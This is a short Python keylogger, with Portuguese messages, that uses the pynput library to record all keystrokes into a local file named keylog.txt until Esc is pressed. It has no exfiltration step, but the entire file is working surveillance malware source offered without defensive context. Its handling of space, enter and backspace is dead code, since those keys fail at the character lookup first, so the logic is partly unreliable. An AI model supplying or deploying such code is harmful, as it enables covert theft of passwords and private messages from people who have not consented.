import os
from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def write_log(log):
    try:
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(log)  
    except Exception as e:
        print(f"Erro ao salvar o arquivo: {e}")

def check_directory():
    
    print(f"Diretório atual: {os.getcwd()}")
    
    if not os.access(os.getcwd(), os.W_OK):
        print("Você não tem permissão para gravar no diretório atual.")
    else:
       
        print("Permissão para gravar no diretório confirmada.")
fullog = ''
words = ''

def on_press(key):
    global words
    global fullog
    
    try:
        
        char = key.char
        if char:  
            words += char  
        elif key == Key.space:
            words += ' '  
        elif key == Key.enter:
            words += '\n'  
        elif key == Key.backspace:
            words = words[:-1]  
        elif key == Key.tab:
            words += '\t'  
        
        fullog += words 
        words = ''  
        write_log(fullog)  
        fullog = '' 

    except AttributeError:
        
        if key == Key.esc:
            write_log("Keylogger finalizado.\n")  
            return False  
    
    return True  

check_directory()

with Listener(on_press=on_press) as listener:
    listener.join()  
